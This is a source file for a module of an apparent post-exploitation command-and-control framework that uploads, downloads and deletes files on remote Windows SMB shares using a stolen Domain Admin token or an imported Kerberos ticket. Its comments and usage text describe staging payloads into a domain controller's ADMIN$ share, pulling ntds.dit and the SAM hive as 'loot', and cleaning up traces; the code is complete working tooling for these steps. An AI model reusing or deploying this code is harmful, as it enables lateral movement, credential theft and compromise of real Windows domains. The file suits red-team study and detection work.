# cifs.star — push a file to / pull a file from / remove a file from a
# remote Windows share (CIFS/SMB) under the module's token/ticket context.
#
# Three commands are provided (the CC module config injects a literal argv[0]):
#
#   cifs_upload    →  upload   (src, dest)
#   cifs_download  →  download (src, dest)
#   cifs_rm        →  delete   (dest, rmdir=false)
#
# Use case: this agent runs on a domain-joined host where a Domain Admin is
# logged in (or where a DA token / Kerberos ticket is available in an
# existing agent session). The *target* machine does not run an emp3r0r
# agent, but its ADMIN$/C$/… shares are reachable with the DA identity. This
# module stages a payload (agent, tool, script) onto the target directly
# over CIFS — or removes files from it — using only Win32 file I/O:
#
#     upload:    CreateFileW("\\DC01\ADMIN$\Temp\stage.exe") → WriteFile(...) → CloseHandle
#     download:  CreateFileW("\\DC01\ADMIN$\Temp\ntds.dit") → ReadFile(...) → write_bytes
#     delete:    DeleteFileW / RemoveDirectoryW("\\DC01\ADMIN$\Temp\stage.exe")
#
# Token / ticket handling is performed by the module framework before the
# script starts (agent-side resolveTokenKey), the script itself needs none:
#
#     cifs_upload --src mem:///stage.exe \
#                 --dest \\DC01\ADMIN$\Temp\stage.exe \
#                 --token S-1-5-21-...-1104     # DA token stolen via steal_token
#
# …or with a Kerberos ticket (PTT flow) instead of a stolen token:
#
#     cifs_upload --user CORP.LOCAL/da --ticket <base64 KRB-CRED .kirbi> \
#                 --src mem:///stage.exe --dest \\DC01\ADMIN$\Temp\stage.exe
#
# …and to clean up afterwards:
#
#     cifs_download --src \\DC01\ADMIN$\Temp\loot.zip \\
#                   --dest mem:///loot.zip --token S-1-5-21-...-1104
#
# …and to clean up afterwards:
#
#     cifs_rm --dest \\DC01\ADMIN$\Temp\stage.exe --token S-1-5-21-...-1104
#     cifs_rm --dest \\DC01\ADMIN$\Temp\empty_dir --rmdir true   # empty directory
#
# How the identity reaches the share:
#   * every win_call below runs under runWithToken(), which impersonates the
#     assigned token for the duration of the call. The SMB redirector opens a
#     session for that identity the first time the UNC path is touched.
#   * with a make_token session the network identity is the imported Kerberos
#     ticket (classic PTT); with a stolen DA token the redirector
#     authenticates as the DA (Kerberos from that logon session's LSA cache,
#     or NTLM).
#   * src may be a mem:/// file (encrypted memfs — best for staged payloads),
#     an agent-local path, or an http(s):// URL (e.g. the C2's WWWRoot).
#
# Kerberos vs NTLM: use the target HOSTNAME (\\DC01.corp.local\...) for
# ticket/PTT flows so the redirector requests cifs/<hostname> with the
# imported ticket. An IP address forces NTLM, which only works when the logon
# session has real credentials (stolen token), not with a dummy-password
# netonly make_token session.

GENERIC_WRITE        = 0x40000000
GENERIC_READ         = 0x80000000
FILE_SHARE_READ      = 0x00000001
FILE_SHARE_WRITE     = 0x00000002
CREATE_ALWAYS        = 2
OPEN_EXISTING        = 3
FILE_ATTRIBUTE_NORMAL = 0x80
FILE_FLAG_BACKUP_SEMANTICS = 0x02000000
INVALID_HANDLE_64    = 0xFFFFFFFFFFFFFFFF
INVALID_HANDLE_32    = 0xFFFFFFFF

ERROR_FILE_NOT_FOUND = 2
ERROR_PATH_NOT_FOUND = 3
ERROR_ACCESS_DENIED  = 5
ERROR_SHARING_VIOLATION = 32
ERROR_ALREADY_EXISTS = 183
ERROR_DIR_NOT_EMPTY  = 145


def to_bool(v):
    if v == True:
        return True
    if v == False:
        return False
    s = str(v).strip().lower()
    return s in ("true", "1", "yes", "on")


def strip_quotes(s):
    s = s.strip()
    if len(s) >= 2:
        first = s[0]
        last = s[len(s) - 1]
        if (first == '"' and last == '"') or (first == "'" and last == "'"):
            return s[1:len(s) - 1]
    return s


def is_invalid_handle(h):
    return h == INVALID_HANDLE_64 or h == INVALID_HANDLE_32 or h == 0


def fmt_winerr(res):
    code = int(res.get("err_code", 0))
    msg = str(res.get("error", ""))
    hint = ""
    if code == ERROR_ACCESS_DENIED:
        hint = " (access denied — share ACL or wrong identity; check --token/--user/--ticket)"
    elif code == 1326:
        hint = " (logon failure — no valid credentials/ticket in the logon session)"
    elif code == 53 or code == 67 or code == 121 or code == 64:
        hint = " (server/share unreachable or share name wrong — is the host up and reachable?)"
    elif code == ERROR_FILE_NOT_FOUND or code == ERROR_PATH_NOT_FOUND:
        hint = " (file/directory not found at this path)"
    elif code == ERROR_SHARING_VIOLATION:
        hint = " (sharing violation — file is locked by another process)"
    elif code == ERROR_DIR_NOT_EMPTY:
        hint = " (directory is not empty)"
    return "error %d (%s)%s" % (code, msg, hint)


# parse_positive_int parses a decimal integer, None on anything else.
def parse_positive_int(raw):
    s = str(raw).strip()
    if s == "":
        return None
    for i in range(len(s)):
        c = s[i]
        if c < "0" or c > "9":
            return None
    return int(s)


# parse_unc splits a destination UNC like
#   \\DC01\ADMIN$\Temp\stage.exe
# into {"server":"DC01","share":"ADMIN$","dirs":["Temp"],"file":"stage.exe"}
def parse_unc(unc):
    parts = str_split(unc, "\\")
    # ["", "", "server", "share", "dir1", ..., "file"]
    if len(parts) < 4:
        return None
    if parts[0] != "" or parts[1] != "":
        return None
    if parts[2] == "" or parts[3] == "":
        return None
    server = parts[2]
    share = parts[3]
    fname = parts[len(parts) - 1]
    dirs = []
    for i in range(4, len(parts) - 1):
        if parts[i] != "":
            dirs.append(parts[i])
    if fname == "":
        return None
    return {"server": server, "share": share, "dirs": dirs, "file": fname}


# effective_identity returns "DOMAIN\user (S-1-...)" of the identity the
# module currently runs under (the assigned stolen token, make_token session,
# or the process identity when none was set). Returns "" when unresolvable.
def effective_identity():
    TokenUser = 1
    h = current_token()
    if h == 0:
        return ""

    need_ptr = win_alloc(4)
    win_call("advapi32.dll", "GetTokenInformation", h, TokenUser, 0, 0, need_ptr)
    need = read_uint32(need_ptr, 0)
    win_free(need_ptr)
    if need == 0 or need > 65536:
        win_call("kernel32.dll", "CloseHandle", h)
        return ""

    tok_buf = win_alloc(need)
    got_ptr = win_alloc(4)
    res = win_call("advapi32.dll", "GetTokenInformation", h, TokenUser, tok_buf, need, got_ptr)
    win_free(got_ptr)
    if res["r1"] == 0:
        win_free(tok_buf)
        win_call("kernel32.dll", "CloseHandle", h)
        return ""

    sid = read_ptr(tok_buf, 0)
    if sid == 0:
        win_free(tok_buf)
        win_call("kernel32.dll", "CloseHandle", h)
        return ""

    # NOTE: sid points into tok_buf — keep tok_buf alive until every API that
    # consumes the SID (ConvertSidToStringSidW / LookupAccountSidW) has run.

    # SID string, e.g. S-1-5-21-...
    sid_str = ""
    str_ptr_ptr = win_alloc(8)
    res = win_call("advapi32.dll", "ConvertSidToStringSidW", sid, str_ptr_ptr)
    if res["r1"] != 0:
        str_ptr = read_ptr(str_ptr_ptr, 0)
        if str_ptr != 0:
            sid_str = read_wstring(str_ptr)
            win_call("kernel32.dll", "LocalFree", str_ptr)
    win_free(str_ptr_ptr)

    # resolve DOMAIN\user via LookupAccountSidW (two-call sizing pattern)
    account = ""
    domain = ""
    cch_name = win_alloc(4)
    cch_dom = win_alloc(4)
    pe_use = win_alloc(4)
    win_call("advapi32.dll", "LookupAccountSidW", 0, sid, 0, cch_name, 0, cch_dom, pe_use)
    name_size = read_uint32(cch_name, 0)
    dom_size = read_uint32(cch_dom, 0)
    if name_size == 0:
        name_size = 256
    if dom_size == 0:
        dom_size = 256
    name_buf = win_alloc(name_size * 2)
    dom_buf = win_alloc(dom_size * 2)
    res = win_call("advapi32.dll", "LookupAccountSidW", 0, sid, name_buf, cch_name,
                   dom_buf, cch_dom, pe_use)
    if res["r1"] != 0:
        account = read_wstring(name_buf)
        domain = read_wstring(dom_buf)
    win_free(cch_name)
    win_free(cch_dom)
    win_free(pe_use)
    win_free(name_buf)
    win_free(dom_buf)

    win_free(tok_buf)
    win_call("kernel32.dll", "CloseHandle", h)

    if account == "":
        return sid_str
    if domain == "":
        return "%s (%s)" % (account, sid_str)
    return "%s\\%s (%s)" % (domain, account, sid_str)


# load_payload fetches the bytes to upload. Supports:
#   http(s)://…  – http_get
#   mem:///…     – encrypted memfs (read_file; staged via CC 'put --dst mem:///…')
#   C:\…         – local file on this agent
#
# (downloads have no source-side plumbing: bytes stream straight from the
# remote handle via ReadFile + win_read_mem into write_bytes)
def load_payload(src):
    low = src.lower()
    if low.startswith("http://") or low.startswith("https://"):
        print("[*] Fetching payload from %s" % src)
        data = http_get(src)
        if len(data) == 0:
            return None, "http_get returned an empty body (HTTP error or empty file?)"
        return data, ""
    if not exists(src):
        msg = ("source '%s' not found on this agent — stage it first "
               + "(CC: 'put --src <local> --dst mem:///...' into memfs) or use an http(s):// URL")
        return None, msg % src
    data = read_file(src)
    if data == None:
        return None, "cannot read '%s'" % src
    return data, ""


# ensure_remote_dirs best-effort creates the directory chain below the share
# root (e.g. Temp\sub for \\DC01\ADMIN$\Temp\sub\x.exe). Errors are reported
# except ERROR_ALREADY_EXISTS.
def ensure_remote_dirs(server, share, dirs):
    cur = "\\\\" + server + "\\" + share
    for d in dirs:
        cur = cur + "\\" + d
        res = win_call("kernel32.dll", "CreateDirectoryW", cur, 0)
        if res["r1"] == 0:
            code = int(res.get("err_code", 0))
            if code != ERROR_ALREADY_EXISTS:
                return False, "CreateDirectoryW %s: %s" % (cur, fmt_winerr(res))
    return True, ""


# open_remote opens a remote file with the given access rights (upload uses
# GENERIC_WRITE + CREATE_ALWAYS, download GENERIC_READ + OPEN_EXISTING).
# Returns (handle, error).
def open_remote(unc_path, access):
    creation = OPEN_EXISTING
    if access == GENERIC_WRITE:
        creation = CREATE_ALWAYS
    res = win_call("kernel32.dll", "CreateFileW", unc_path,
                   access, FILE_SHARE_READ | FILE_SHARE_WRITE,
                   0, creation, FILE_ATTRIBUTE_NORMAL, 0)
    h = res["r1"]
    if is_invalid_handle(h):
        return 0, "CreateFileW %s: %s" % (unc_path, fmt_winerr(res))
    return h, ""


# remote_size reads the size of an open file handle via GetFileSizeEx.
# Returns (size, error).
def remote_size(h):
    size_ptr = win_alloc(8)
    res = win_call("kernel32.dll", "GetFileSizeEx", h, size_ptr)
    size = read_u64(size_ptr, 0)
    win_free(size_ptr)
    if res["r1"] == 0:
        return 0, "GetFileSizeEx: %s" % fmt_winerr(res)
    return size, ""


# stream_write writes `data` to the open remote handle in chunked WriteFile
# calls. Returns (bytes_written, error).
def stream_write(h, data, chunk):
    total = len(data)
    if total == 0:
        return 0, ""

    buf = cstring_ptr(data)
    if buf == 0:
        return 0, "failed to allocate %d-byte payload buffer" % total

    written_ptr = win_alloc(4)
    off = 0
    last_tick = -1
    while off < total:
        n = chunk
        if total - off < n:
            n = total - off
        res = win_call("kernel32.dll", "WriteFile", h, buf + off, n, written_ptr, 0)
        if res["r1"] == 0:
            win_free(written_ptr)
            win_free(buf)
            return off, "WriteFile at offset %d: %s" % (off, fmt_winerr(res))
        w = read_uint32(written_ptr, 0)
        if w == 0:
            win_free(written_ptr)
            win_free(buf)
            return off, "WriteFile stalled at offset %d" % off
        off += w
        pct = (off * 100) // total
        if pct // 10 != last_tick:
            last_tick = pct // 10
            print("[*] Uploaded %d/%d bytes (%d%%)" % (off, total, pct))

    win_free(written_ptr)
    win_free(buf)
    return off, ""


# verify_remote re-opens the destination read-only and confirms its size.
def verify_remote(unc_path, expected):
    h, err = open_remote(unc_path, 0)
    if h == 0:
        return False, err
    size_ptr = win_alloc(8)
    res = win_call("kernel32.dll", "GetFileSizeEx", h, size_ptr)
    actual = read_u64(size_ptr, 0)
    win_free(size_ptr)
    win_call("kernel32.dll", "CloseHandle", h)
    if res["r1"] == 0:
        return False, "GetFileSizeEx %s: %s" % (unc_path, fmt_winerr(res))
    if actual != expected:
        return False, "size mismatch: remote has %d bytes, expected %d" % (actual, expected)
    return True, ""


# open_remote opens a remote file with the given access rights (upload uses
# GENERIC_WRITE + CREATE_ALWAYS, download GENERIC_READ + OPEN_EXISTING).
def open_remote(unc_path, access):
    creation = OPEN_EXISTING
    if access == GENERIC_WRITE:
        creation = CREATE_ALWAYS
    res = win_call("kernel32.dll", "CreateFileW", unc_path,
                   access, FILE_SHARE_READ | FILE_SHARE_WRITE,
                   0, creation, FILE_ATTRIBUTE_NORMAL, 0)
    h = res["r1"]
    if is_invalid_handle(h):
        return 0, "CreateFileW %s: %s" % (unc_path, fmt_winerr(res))
    return h, ""


# remote_size reads the size of an open file handle via GetFileSizeEx.
def remote_size(h):
    size_ptr = win_alloc(8)
    res = win_call("kernel32.dll", "GetFileSizeEx", h, size_ptr)
    size = read_u64(size_ptr, 0)
    win_free(size_ptr)
    if res["r1"] == 0:
        return 0, "GetFileSizeEx: %s" % fmt_winerr(res)
    return size, ""


# stream_read reads the whole open remote handle in chunked ReadFile calls,
# mirroring the upload path's chunked WriteFile loop. Each chunk is pulled
# out of unmanaged memory with win_read_mem and converted to a base64 string
# via bytes_to_b64 (byte-exact, UTF-8-safe); the accumulated base64 chunks
# are decoded once by b64_to_bytes at the end. Returns (bytes, error).
def stream_read(h, total, chunk):
    # Separate allocations: read buffer (chunk-sized) and the ReadFile
    # bytes-read DWORD. Never alias them, and never read into a smaller
    # allocation — ReadFile faults (ERROR_NOACCESS 998) past the buffer.
    buf_ptr = win_alloc(chunk)
    if buf_ptr == 0:
        return None, "failed to allocate %d-byte ReadFile buffer" % chunk
    read_ptr = win_alloc(4)
    if read_ptr == 0:
        win_free(buf_ptr)
        return None, "failed to allocate ReadFile bytes-read buffer"

    parts = []
    got = 0
    last_tick = -1
    while got < total:
        n = chunk
        if total - got < n:
            n = total - got
        res = win_call("kernel32.dll", "ReadFile", h, buf_ptr, n, read_ptr, 0)
        if res["r1"] == 0:
            win_free(read_ptr)
            win_free(buf_ptr)
            return None, "ReadFile at offset %d: %s" % (got, fmt_winerr(res))
        r = read_uint32(read_ptr, 0)
        if r == 0:
            win_free(read_ptr)
            win_free(buf_ptr)
            return None, "ReadFile returned EOF at offset %d (file shrunk? locked?)" % got
        parts.append(bytes_to_b64(win_read_mem(buf_ptr, r)))
        got += r
        pct = (got * 100) // total
        if pct // 10 != last_tick:
            last_tick = pct // 10
            print("[*] Downloaded %d/%d bytes (%d%%)" % (got, total, pct))

    win_free(read_ptr)
    win_free(buf_ptr)
    # base64 chunks are individually padded — pass the list as-is and let
    # b64_to_bytes decode each element before concatenating.
    return b64_to_bytes(parts), ""


# save_download writes the downloaded bytes to dest via the agent's
# binary-safe writer. Supports mem:/// (encrypted memfs — retrievable with
# CC 'get') and local disk paths. Returns (bytes_written, error).
def save_download(dest, data):
    if not (dest.startswith("mem://") or str_contains(dest, ":\\") or str_contains(dest, ":/")):
        msg = "dest must be a mem:/// path or a local path like C:\\loot.zip (not a UNC path)"
        print("[-] %s" % msg)
        return 0, msg
    written = write_bytes(dest, data)
    if written != len(data):
        return written, "short write: wrote %d of %d bytes to %s" % (written, len(data), dest)
    return written, ""


# verify_download re-opens the remote file read-only and streams it again,
# hashing both transfers; a mismatch means the file changed mid-download or
# the chunk pipeline is lossy. Returns ("", error) on success.
def verify_download(src, first_data, size, chunk):
    h, err = open_remote(src, GENERIC_READ)
    if h == 0:
        return "", err
    data, err = stream_read(h, size, chunk)
    win_call("kernel32.dll", "CloseHandle", h)
    if err != "":
        return "", err
    if crypto_hash("sha256", data) != crypto_hash("sha256", first_data):
        return "", "re-read of %s does not match the first download (file changed mid-transfer?)" % src
    return "", ""


# confirm_gone checks that dest can no longer be opened after a successful
# DeleteFileW/RemoveDirectoryW. Returns (gone, note).
def confirm_gone(dest, is_dir):
    flags = FILE_FLAG_BACKUP_SEMANTICS if is_dir else FILE_ATTRIBUTE_NORMAL
    res = win_call("kernel32.dll", "CreateFileW", dest,
                   0, FILE_SHARE_READ | FILE_SHARE_WRITE,
                   0, OPEN_EXISTING, flags, 0)
    if not is_invalid_handle(res["r1"]):
        win_call("kernel32.dll", "CloseHandle", res["r1"])
        return False, "destination is still accessible after removal"
    code = int(res.get("err_code", 0))
    if code == ERROR_FILE_NOT_FOUND or code == ERROR_PATH_NOT_FOUND:
        return True, ""
    return True, "cannot re-open to confirm (error %d)" % code


# ── command: upload ─────────────────────────────────────────────────────────

def cmd_upload(args):
    src = strip_quotes(args[0]) if len(args) > 0 else ""
    dest = strip_quotes(args[1]) if len(args) > 1 else ""
    chunk_kb_raw = args[2] if len(args) > 2 else "1024"
    delete_src = to_bool(args[3]) if len(args) > 3 else False
    do_verify = to_bool(args[4]) if len(args) > 4 else False

    if src == "" or dest == "":
        usage()
        return "Fail: both src and dest are required"

    chunk_kb = 1024
    kb = parse_positive_int(chunk_kb_raw)
    if kb == None:
        print("[!] invalid chunk_kb '%s', using 1024" % str(chunk_kb_raw))
    else:
        chunk_kb = kb
    if chunk_kb < 1:
        chunk_kb = 1024
    chunk = chunk_kb * 1024

    unc = parse_unc(dest)
    if unc == None:
        usage()
        return "Fail: dest must be a full UNC path under an existing share, e.g. \\\\DC01\\ADMIN$\\Temp\\stage.exe"

    print("[*] cifs_upload: %s  ->  %s" % (src, dest))
    who = effective_identity()
    if who != "":
        print("[*] Effective identity: %s" % who)
    else:
        print("[!] Could not resolve the effective token identity")

    data, err = load_payload(src)
    if err != "":
        return "Fail: " + err
    total = len(data)
    print("[*] Payload size: %d bytes" % total)

    # Make sure the destination folder exists (best effort) before opening.
    ok, err = ensure_remote_dirs(unc["server"], unc["share"], unc["dirs"])
    if not ok:
        return "Fail: " + err

    h, err = open_remote(dest, GENERIC_WRITE)
    if h == 0:
        # One retry: some targets need a moment / the dir chain was just made.
        ok, err2 = ensure_remote_dirs(unc["server"], unc["share"], unc["dirs"])
        if ok:
            h, err = open_remote(dest, GENERIC_WRITE)
        if h == 0:
            return "Fail: " + err

    written, err = stream_write(h, data, chunk)
    win_call("kernel32.dll", "CloseHandle", h)
    if err != "":
        print("[-] Upload interrupted after %d bytes — partial remote file may remain" % written)
        return "Fail: " + err

    if do_verify:
        ok, verr = verify_remote(dest, total)
        if not ok:
            return "Fail: upload finished but verify failed: " + verr
        print("[+] Verified: %d bytes on %s" % (total, dest))

    if delete_src and (src.startswith("mem://") or src.find("://") == -1):
        if exists(src):
            remove(src)
            print("[*] Removed source %s" % src)

    print("[+] Upload complete: %d bytes -> %s" % (total, dest))
    return "OK: uploaded %d bytes to %s as %s" % (total, dest, who if who != "" else "the assigned token context")


# ── command: download ─────────────────────────────────────────────────────

def cmd_download(args):
    src = strip_quotes(args[0]) if len(args) > 0 else ""
    dest = strip_quotes(args[1]) if len(args) > 1 else ""
    chunk_kb_raw = args[2] if len(args) > 2 else "1024"
    do_verify = to_bool(args[3]) if len(args) > 3 else False

    if src == "" or dest == "":
        usage()
        return "Fail: both src and dest are required"

    chunk_kb = 1024
    kb = parse_positive_int(chunk_kb_raw)
    if kb == None:
        print("[!] invalid chunk_kb '%s', using 1024" % str(chunk_kb_raw))
    else:
        chunk_kb = kb
    if chunk_kb < 1:
        chunk_kb = 1024
    chunk = chunk_kb * 1024

    unc = parse_unc(src)
    if unc == None:
        usage()
        return "Fail: src must be a full UNC path under an existing share, e.g. \\\\DC01\\C$\\Windows\\system32\\config\\SAM"

    # Reject a UNC dest before any network I/O: downloads land on this agent.
    if dest.startswith("\\\\"):
        usage()
        return "Fail: dest must be a mem:/// path or a local path (e.g. mem:///loot.zip or C:\\loot.zip) — not another UNC share"

    print("[*] cifs_download: %s  ->  %s" % (src, dest))
    who = effective_identity()
    if who != "":
        print("[*] Effective identity: %s" % who)
    else:
        print("[!] Could not resolve the effective token identity")

    h, err = open_remote(src, GENERIC_READ)
    if h == 0:
        return "Fail: " + err

    size, err = remote_size(h)
    if err != "":
        win_call("kernel32.dll", "CloseHandle", h)
        return "Fail: " + err
    if size == 0:
        win_call("kernel32.dll", "CloseHandle", h)
        return "Fail: %s is empty (0 bytes) — wrong path, or the file is locked/zero-length" % src
    print("[*] Remote file size: %d bytes" % size)

    data, err = stream_read(h, size, chunk)
    win_call("kernel32.dll", "CloseHandle", h)
    if err != "":
        print("[-] Download interrupted — partial transfer discarded, nothing was saved")
        return "Fail: " + err

    written, err = save_download(dest, data)
    if err != "":
        return "Fail: " + err

    if do_verify:
        _, verr = verify_download(src, data, size, chunk)
        if verr != "":
            return "Fail: download finished but verify failed: " + verr
        print("[+] Verified: re-read of %s matches (%d bytes)" % (src, size))

    print("[+] Download complete: %d bytes -> %s" % (written, dest))
    return "OK: downloaded %d bytes from %s to %s as %s" % (
        written, src, dest, who if who != "" else "the assigned token context")


# ── command: delete ─────────────────────────────────────────────────────────

def cmd_delete(args):
    dest = strip_quotes(args[0]) if len(args) > 0 else ""
    rmdir = to_bool(args[1]) if len(args) > 1 else False

    if dest == "":
        usage()
        return "Fail: dest (UNC path to the file or directory to remove) is required"

    unc = parse_unc(dest)
    if unc == None:
        usage()
        return "Fail: dest must be a full UNC path under an existing share, e.g. \\\\DC01\\ADMIN$\\Temp\\stage.exe"

    kind = "directory" if rmdir else "file"
    print("[*] cifs_rm: removing %s %s" % (kind, dest))
    who = effective_identity()
    if who != "":
        print("[*] Effective identity: %s" % who)
    else:
        print("[!] Could not resolve the effective token identity")

    if rmdir:
        res = win_call("kernel32.dll", "RemoveDirectoryW", dest)
    else:
        # Clear a possible read-only attribute so DeleteFileW succeeds.
        win_call("kernel32.dll", "SetFileAttributesW", dest, FILE_ATTRIBUTE_NORMAL)
        res = win_call("kernel32.dll", "DeleteFileW", dest)

    if res["r1"] == 0:
        code = int(res.get("err_code", 0))
        hint = ""
        if code == ERROR_FILE_NOT_FOUND or code == ERROR_PATH_NOT_FOUND:
            hint = " (already gone or wrong path)"
        elif code == ERROR_ACCESS_DENIED:
            if rmdir:
                hint = " (access denied — ACLs, or the target is a file, not a directory?)"
            else:
                hint = " (access denied — ACLs, or the target is a directory? pass --rmdir true)"
        return "Fail: %s %s: %s" % (kind, dest, fmt_winerr(res)) + hint

    gone, note = confirm_gone(dest, rmdir)
    if not gone:
        return "Fail: %s %s: %s" % (kind, dest, note)

    print("[+] Removed %s %s" % (kind, dest))
    if note != "":
        print("[!] %s" % note)
    return "OK: removed %s %s" % (kind, dest)


def usage():
    print("[*] cifs_upload / cifs_download / cifs_rm: work with files on a remote")
    print("    SMB/CIFS share as the module's token/ticket identity (no agent needed")
    print("    on the target).")
    print("")
    print("  upload:")
    print("    cifs_upload --src <mem:///file|C:\\path|http(s)://url> \\")
    print("                --dest \\\\SERVER\\SHARE\\dir\\file  (e.g. \\\\DC01\\ADMIN$\\Temp\\stage.exe)")
    print("                [--chunk_kb 1024] [--delete_src true] [--verify true]")
    print("  download:")
    print("    cifs_download --src \\\\SERVER\\SHARE\\dir\\file  (e.g. \\\\DC01\\C$\\Windows\\system32\\config\\SAM)")
    print("                  --dest <mem:///file|C:\\path>  (mem:///loot.zip retrieves it with CC 'get')")
    print("                  [--chunk_kb 1024] [--verify true]")
    print("  delete:")
    print("    cifs_rm --dest \\\\SERVER\\SHARE\\dir\\file")
    print("            [--rmdir true]   # dest is an (empty) directory instead of a file")
    print("  identity (any):")
    print("    --token <SID|session>   # stolen DA token / make_token session")
    print("    --user DOMAIN/user      # or create a make_token session…")
    print("    --ticket <b64 kirbi>    # …and import a Kerberos ticket into it")


def main(*args):
    cmd = str(args[0]).lower() if len(args) > 0 else ""
    if cmd in ("delete", "rm", "del", "remove"):
        return cmd_delete(args[1:])
    if cmd in ("upload", "put", "add"):
        return cmd_upload(args[1:])
    if cmd in ("download", "dl", "get", "fetch"):
        return cmd_download(args[1:])
    if cmd in ("help", "-h", "--help"):
        usage()
        return "OK"
    # No command prefix (direct script invocation): legacy upload behaviour.
    return cmd_upload(args)
